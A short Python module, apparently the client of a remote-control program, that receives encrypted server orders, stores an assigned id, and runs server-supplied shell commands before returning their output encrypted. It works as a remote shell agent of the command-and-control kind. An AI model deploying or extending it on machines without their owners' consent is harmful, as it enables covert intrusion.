from src.ClientSide.saveId import saveId
from src.ClientSide.execCommand import execCommand
from src.ServerCom.encryptData import encryptData, symEncrypt

def callManager(Query, socket, clientId, str_key, sym_key):
    print("Command from server: ", Query)
    if "id" in Query:
        saveId(str(Query["id"]))
        returnQuery = '{"head":{"id":"%s"},"body":{"message":"Id saved successfully"}}' %(Query["id"])
        encrQuery = symEncrypt(sym_key, returnQuery.encode('utf-8'))
        socket.mysend(encrQuery)
        if clientId == False:
            clientId = Query["id"]
        return "Id saved"
    
    elif "order" in Query:
        if Query["order"] == "shell":
            print("Comanda rebuda:", Query["command"])
            output = execCommand(Query["command"])
            output = output.replace("\n", "\\n")
            returnQuery = '{"head":{"id":"%s"},"body":{"message":"Command executed", "command":"%s", "output":"%s"}}' %(clientId, Query["command"], output)
            print("symKeyTest: ", sym_key)
            encrQuery = symEncrypt(sym_key, returnQuery.encode('utf-8'))
            socket.mysend(encrQuery)
            return "Comanda del servidor"
    else:
        return "None executed"